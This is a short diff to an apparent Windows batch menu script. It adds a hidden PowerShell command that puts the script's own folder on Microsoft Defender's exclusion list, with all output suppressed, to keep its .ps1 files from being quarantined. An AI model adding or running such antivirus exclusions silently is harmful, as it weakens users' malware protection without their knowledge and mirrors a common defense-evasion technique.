@@ -14,6 +14,9 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
+:: -- Add script directory to Defender exclusions so AMSI doesn't quarantine .ps1 files --
+powershell.exe -NoProfile -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue" >nul 2>&1
+
 :menu
 cls
 echo.
